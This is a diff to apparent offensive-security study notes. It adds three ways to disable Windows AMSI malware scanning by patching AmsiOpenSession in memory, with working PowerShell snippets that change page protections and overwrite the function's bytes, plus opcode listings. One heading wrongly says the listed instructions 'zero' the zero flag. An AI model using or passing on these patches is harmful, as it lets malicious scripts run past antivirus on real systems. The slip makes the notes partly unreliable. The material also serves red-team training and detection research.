@@ -45,7 +45,39 @@ Overwrite the `TEST RDX,RDX` with an `XOR RAX,RAX` instruction, forcing the exec
 > 
 > `XOR RAX,RAX` is compiled into the binary value `0x4831c0`, which matches the number of bytes we require.
 
+<!-- TODO(done 2026-09-24): documented three alternative patch points inside AmsiOpenSession below. Original marker kept for traceability. -->
 TODO: Search for any other instructions inside _AmsiOpenSession_ that could be overwritten just as easily to achieve the same goal.
+
+> [!Note] Other equally-easy patch points inside `AmsiOpenSession`
+> Recall the two instructions we care about at the top of the function and the error branch it jumps to:
+> ```
+> amsi!AmsiOpenSession:
+> 00007fff`aa0824c0 4885d2          test    rdx,rdx                    ; <- option A patched this
+> 00007fff`aa0824c3 7446            je      amsi!AmsiOpenSession+0x4b  ; <- conditional jump
+> ...
+> 00007fff`aa08250b b857000780      mov     eax,80070057h             ; E_INVALIDARG (error branch)
+> 00007fff`aa082510 c3              ret
+> ```
+> The goal is always the same: make the function return a **non-`S_OK`** value (here `0x80070057`, `E_INVALIDARG`) so the caller treats the AMSI session as unusable. Besides overwriting `TEST RDX,RDX` with `XOR RAX,RAX`, any of the following achieves it and touches the same or fewer bytes:
+>
+> 1. **Flip the conditional jump into an unconditional one.** Overwrite the `JE` opcode `74` at `+0x03` with `EB` (`JMP`), keeping the same relative offset `46`. Execution then *always* falls through to the `mov eax,80070057h ; ret` error branch, regardless of what `rdx` holds. This is a **single-byte** patch (`0x74` -> `0xEB`):
+> ```powershell
+> [IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+> $vp.Invoke($funcAddr, 4, 0x40, [ref]$oldProtectionBuffer)   # make page writable
+> # +0x03 is the JE opcode byte; turn 0x74 (JE) into 0xEB (JMP)
+> $jmp = [Byte[]] (0xEB)
+> [System.Runtime.InteropServices.Marshal]::Copy($jmp, 0, [IntPtr]($funcAddr.ToInt64() + 3), 1)
+> $vp.Invoke($funcAddr, 4, 0x20, [ref]$oldProtectionBuffer)   # restore perms
+> ```
+> 2. **Write the error return directly over the prologue.** Copy `mov eax,0x80070057 ; ret` (`B8 57 00 07 80 C3`, 6 bytes) over the very first bytes of the function so it returns `E_INVALIDARG` immediately without executing any real logic:
+> ```powershell
+> $buf = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)   # mov eax,80070057h ; ret
+> [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 6)
+> ```
+> 3. **Any instruction that zeroes ZF before the `JE`.** `XOR RAX,RAX`, `XOR RCX,RCX`, `SUB RAX,RAX`, or a `CMP` of a register with itself all set the zero flag, so substituting them for `TEST RDX,RDX` forces the `JE` to be taken. The original write used `XOR RAX,RAX` (`48 31 C0`); `XOR RCX,RCX` (`48 31 C9`) is an equally valid 3-byte drop-in.
+>
+> > [!Warning]
+> > Returning `S_OK` (`0`) here would mean *success* — that does **not** disable AMSI. To bypass, the function must report an error (`0x80070057` / any non-zero HRESULT). This is the opposite of patching `AmsiScanBuffer`, which we want to return `S_OK` (see the *Extra Mile* section below).
 
 1. Obtain the memory address of _AmsiOpenSession_ (via [_GetModuleHandle_](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea) to obtain the base address of **AMSI.DLL**, then call [_GetProcAddress_](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress))
 
